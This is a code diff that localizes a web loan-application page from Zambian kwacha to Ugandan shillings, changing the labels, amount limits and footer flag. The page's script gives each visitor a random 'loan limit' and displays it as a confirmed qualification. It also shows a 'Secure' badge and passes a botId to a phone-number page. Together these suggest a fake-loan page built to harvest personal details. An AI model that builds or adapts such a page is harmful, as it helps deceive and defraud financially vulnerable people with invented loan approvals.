@@ -164,16 +164,16 @@
         <div class="divider"></div>
         <div class="qualification">
             <span class="icon">✅</span>
-            <p>Your loan limit is <strong id="limitAmountText">ZMW 0</strong>.</p>
+            <p>Your loan limit is <strong id="limitAmountText">UGX 0</strong>.</p>
         </div>
         <div class="amount-display-wrapper">
-            <div class="amount-display" id="amountDisplay">ZMW <span id="amountValue">0</span></div>
+            <div class="amount-display" id="amountDisplay">UGX <span id="amountValue">0</span></div>
         </div>
 
         <!-- Custom amount input -->
         <div class="custom-amount-group">
-            <label for="customAmount">Want a lower amount? Enter it here (ZMW)</label>
-            <input type="number" id="customAmount" min="500" step="100" placeholder="e.g. 2000" />
+            <label for="customAmount">Want a lower amount? Enter it here (UGX)</label>
+            <input type="number" id="customAmount" min="2000" step="1000" placeholder="e.g. 20000" />
             <div class="custom-error" id="customError"></div>
         </div>
 
@@ -185,13 +185,13 @@
         </div>
 
         <div class="results-card">
-            <div class="result-row"><span class="label">Loan Amount</span><span class="value" id="principalDisplay">ZMW 0</span></div>
-            <div class="result-row"><span class="label">Interest</span><span class="value" id="interestDisplay">ZMW 0</span></div>
-            <div class="result-row total"><span class="label">Total Payable</span><span class="value" id="totalDisplay">ZMW 0</span></div>
+            <div class="result-row"><span class="label">Loan Amount</span><span class="value" id="principalDisplay">UGX 0</span></div>
+            <div class="result-row"><span class="label">Interest</span><span class="value" id="interestDisplay">UGX 0</span></div>
+            <div class="result-row total"><span class="label">Total Payable</span><span class="value" id="totalDisplay">UGX 0</span></div>
         </div>
         <div class="interest-note" id="rateNote">* Interest rate: 5% flat for 1 month.</div>
-        <button class="btn-continue" id="continueBtn">Apply for ZMW 0</button>
-        <div class="footer-note"><span>🔒 Secure</span> <span class="dot">•</span> <span>⚡ Flexible terms</span> <span class="dot">•</span> <span>🇿🇲 Zambia</span></div>
+        <button class="btn-continue" id="continueBtn">Apply for UGX 0</button>
+        <div class="footer-note"><span>🔒 Secure</span> <span class="dot">•</span> <span>⚡ Flexible terms</span> <span class="dot">•</span> <span>🇺🇬 Uganda</span></div>
     </div>
     <script>
         (function() {
@@ -215,22 +215,23 @@
             backLink.href = 'phone.html?botId=' + encodeURIComponent(botId);
 
             const RATES = { '1': 0.05, '3': 0.12, '6': 0.22, '12': 0.40 };
-            const MIN_AMOUNT = 500;
+            const MIN_AMOUNT = 2000; // UGX minimum (direct conversion from ZMW 500)
 
-            // Generate a random loan limit between 3,500 and 20,000 ZMW (multiples of 100)
-            const minLimit = 3500;
-            const maxLimit = 20000;
-            const steps = (maxLimit - minLimit) / 100;
-            const randomLimit = minLimit + Math.floor(Math.random() * (steps + 1)) * 100;
+            // Generate a random loan limit between 14,000 and 80,000 UGX (multiples of 1000)
+            // Direct conversion from ZMW 3,500–20,000 at ~4x rate
+            const minLimit = 14000;
+            const maxLimit = 80000;
+            const steps = (maxLimit - minLimit) / 1000;
+            const randomLimit = minLimit + Math.floor(Math.random() * (steps + 1)) * 1000;
             const loanLimit = Math.min(maxLimit, Math.max(minLimit, randomLimit));
 
             let currentPeriod = '1';
             let currentAmount = loanLimit;
 
             // Set initial displays
-            limitAmountText.textContent = `ZMW ${loanLimit.toLocaleString()}`;
+            limitAmountText.textContent = `UGX ${loanLimit.toLocaleString()}`;
             amountValue.textContent = loanLimit.toLocaleString();
-            principalDisplay.textContent = `ZMW ${loanLimit.toLocaleString()}`;
+            principalDisplay.textContent = `UGX ${loanLimit.toLocaleString()}`;
             customAmountInput.placeholder = `Max ${loanLimit.toLocaleString()}`;
 
             function updatePage() {
@@ -239,10 +240,10 @@
                 const total = currentAmount + interest;
 
                 amountValue.textContent = currentAmount.toLocaleString();
-                principalDisplay.textContent = `ZMW ${currentAmount.toLocaleString()}`;
-                interestDisplay.textContent = `ZMW ${interest.toLocaleString()}`;
-                totalDisplay.textContent = `ZMW ${total.toLocaleString()}`;
-                continueBtn.textContent = `Apply for ZMW ${currentAmount.toLocaleString()}`;
+                principalDisplay.textContent = `UGX ${currentAmount.toLocaleString()}`;
+                interestDisplay.textContent = `UGX ${interest.toLocaleString()}`;
+                totalDisplay.textContent = `UGX ${total.toLocaleString()}`;
+                continueBtn.textContent = `Apply for UGX ${currentAmount.toLocaleString()}`;
 
                 const periodText = currentPeriod === '1' ? '1 month' : currentPeriod + ' months';
                 const ratePercent = (rate * 100).toFixed(0);
@@ -264,13 +265,13 @@
                 const value = Number(raw);
                 if (isNaN(value) || value < MIN_AMOUNT) {
                     customAmountInput.classList.add('error');
-                    customError.textContent = `Amount must be at least ZMW ${MIN_AMOUNT}.`;
+                    customError.textContent = `Amount must be at least UGX ${MIN_AMOUNT.toLocaleString()}.`;
                     return;
                 }
 
                 if (value > loanLimit) {
                     customAmountInput.classList.add('error');
-                    customError.textContent = `Amount cannot exceed your limit of ZMW ${loanLimit.toLocaleString()}.`;
+                    customError.textContent = `Amount cannot exceed your limit of UGX ${loanLimit.toLocaleString()}.`;
                     return;
                 }
 
